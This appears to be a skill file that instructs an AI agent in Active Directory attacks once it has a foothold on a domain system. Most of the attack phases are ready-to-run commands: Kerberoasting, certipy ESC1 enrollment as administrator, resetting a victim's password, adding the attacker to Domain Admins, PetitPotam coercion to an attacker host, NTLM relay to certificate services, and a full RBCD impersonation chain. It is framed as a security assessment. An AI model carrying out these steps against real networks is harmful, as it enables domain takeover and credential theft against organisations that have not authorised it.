---
name: active-directory
description: Active Directory security assessment methodology. Covers AD reconnaissance, Kerberos attacks (AS-REP roast, Kerberoast, Golden/Silver Ticket), NTLM relay, SMB relay, ACL abuse (AdminSDHolder, RBCD), domain trust attacks, DCSync, ADCS certificate service abuse (ESC1-ESC13), and BloodHound analysis. Use when you have a foothold on a Windows domain-joined system for AD privilege escalation assessment.
---

# Active Directory Attack Methodology

## Phase 0: Foothold Assessment

- [ ] Domain credentials (user:password)
- [ ] Local admin on workstation
- [ ] Shell on domain-joined server
- [ ] No credentials — anonymous recon only

## Phase 1: Domain Enumeration

```powershell
# Domain info
Get-ADDomain | fl Name,DNSRoot,DistinguishedName
Get-ADDomainController | fl Name,IPv4Address

# Users & groups
Get-ADUser -Filter * | select SamAccountName,Enabled
Get-ADGroup "Domain Admins" | Get-ADGroupMember

# Trusts
Get-ADTrust -Filter *
```

### Without PowerShell:

```cmd
net group "Domain Admins" /domain
nltest /domain_trusts
echo %USERDOMAIN%
```

## Phase 2: BloodHound Collection

```bash
# Windows (SharpHound)
Sharphound.exe --CollectionMethods All --Domain domain.com

# Linux (Python bloodhound)
bloodhound-python -u user -p password -d domain.com -ns DC_IP -c All

# Ingest to BloodHound GUI → find paths to DA
```

## Phase 3: Kerberos Attacks

| Attack | Requirement | Tool | Hashcat Mode |
|--------|------------|------|-------------|
| AS-REP Roast | User without pre-auth required | `impacket-GetNPUsers` | 18200 |
| Kerberoast | Any domain user | `impacket-GetUserSPNs` | 13100 |
| Golden Ticket | KRBTGT hash | `impacket-ticketer` | N/A |
| Silver Ticket | Service account hash | `impacket-ticketer` | N/A |
| DCSync | DA or Replicate rights | `impacket-secretsdump` | N/A |

## Phase 4: ADCS Abuse (ESC1-ESC13)

```bash
# Find vulnerable templates
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# ESC1: Template allows SAN (enroll as admin)
certipy req -u user@domain.com -p password -ca CA-SERVER \
  -template VulnTemplate -target DC_IP -upn administrator@domain.com
```

## Phase 5: ACL Abuse

Dangerous rights to look for in BloodHound:

| Right | What it Allows |
|-------|---------------|
| ForceChangePassword | Reset user's password without current |
| AddMember | Add user to privileged group |
| GenericAll | Full control over object |
| WriteOwner | Change object owner |
| WriteDACL | Modify object's ACL |
| AllExtendedRights | Most dangerous extended rights |

Abuse the rights remotely with `impacket`/`bloodyAD` rather than logging into the box:

```bash
# ForceChangePassword on a target user
net rpc password "victim" "NewP@ss123" -U "domain/attacker%pass" -S DC_IP
# Add yourself to a privileged group (AddMember)
bloodyAD -u attacker -p pass -d domain.com --host DC_IP add groupMember "Domain Admins" attacker
# Targeted Kerberoast after gaining GenericAll over a user (set a fake SPN)
targetedKerberoast.py -u attacker -p pass -d domain.com
```

## Phase 6: Delegation & NTLM Relay

| Delegation type | Abuse |
|---|---|
| Unconstrained | Compromise host → coerce a DC (PetitPotam/PrinterBug) → capture DC TGT → DCSync |
| Constrained (S4U2Proxy) | Control an account trusted for delegation → `getST -impersonate administrator` to the target SPN |
| Resource-Based (RBCD) | Have `GenericWrite`/`WriteDACL` on a computer → set `msDS-AllowedToActOnBehalfOfOtherIdentity` → impersonate any user to it |

```bash
# Coerce + relay to ADCS (ESC8) or LDAP for RBCD
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py -u user -p pass ATTACKER_IP DC_IP   # triggers the DC to authenticate to you

# RBCD end-to-end
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ss' domain.com/user:pass
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.com/user:pass
getST.py -spn cifs/target.domain.com -impersonate administrator domain.com/EVIL$:'P@ss'
```

## Related Skills

- `container-security` — Windows containers and AD-joined nodes connect a cluster breakout into this AD attack surface.
- `cloud-iam-deep` — hybrid AD↔Entra/Azure AD joins mean DCSync'd creds or PRT theft can pivot into the cloud control plane.
- `credential-attack` — feed cracked Kerberoast/AS-REP hashes and sprayed passwords into the foothold phase here.
- `code-review` — when GPO scripts or LDAP-integrated app source is available, audit for hardcoded service-account credentials that shortcut the whole chain.
